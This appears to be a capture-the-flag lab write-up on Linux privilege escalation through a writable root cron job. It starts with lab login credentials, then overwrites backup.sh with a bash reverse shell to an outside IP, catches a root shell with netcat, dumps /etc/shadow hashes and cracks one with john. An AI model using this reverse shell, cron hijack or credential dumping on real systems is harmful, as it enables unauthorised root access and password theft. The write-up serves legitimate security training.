Username: karen
Password: Password1

Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.
The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.

Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.

Any user can read the file keeping system-wide cron jobs under /etc/crontab

While CTF machines can have cron jobs running every minute or every 5 minutes, you will more often see tasks that run daily, weekly or monthly in penetration test engagements.
```
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py
```

Modify the `backup.sh` for a reverse shell

```
$ echo '#!/bin/bash \nbash -i >& /dev/tcp/10.17.21.74/4444 0>&1' > backup.sh
$ cat backup.sh
#!/bin/bash 
bash -i >& /dev/tcp/10.17.21.74/4444 0>&1
$ chmod +x backup.sh
```

Start netcat:
```
[$] <> nc -lvnp 4444             
Listening on 0.0.0.0 4444
Connection received on 10.10.21.89 35644
bash: cannot set terminal process group (13352): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-10-21-89:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```

Get the flag:
```
root@ip-10-10-21-89:/# cd /home
cd /home
root@ip-10-10-21-89:/home# ls
ls
karen
ubuntu
root@ip-10-10-21-89:/home# cd ubuntu
cd ubuntu
root@ip-10-10-21-89:/home/ubuntu# ls
flag5.txt
root@ip-10-10-21-89:/home/ubuntu# cat flag5.txt
cat flag5.txt
THM-383000283
```

Get the Password:
```
root@ip-10-10-21-89:/home/ubuntu# cat /etc/shadow
cat /etc/shadow
root:*:18561:0:99999:7:::
.
.
.
ubuntu:!:18798:0:99999:7:::
karen:$6$ZC4srkt5HufYpAAb$GVDM6arO/qQU.o0kLOZfMLAFGNHXULH5bLlidB455aZkKrMvdB1upyMZZzqdZuzlJTuTHTlsKzQAbSZJr9iE21:18798:0:99999:7:::
lxd:!:18798::::::
matt:$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.:18798:0:99999:7:::
```

Use john to brute force the Password:
```
[$] <> john --wordlist=rockyou.txt hashes.txt       
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123456           (?)
1g 0:00:00:00 100% 33.33g/s 3200p/s 3200c/s 3200C/s 123456..yellow
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```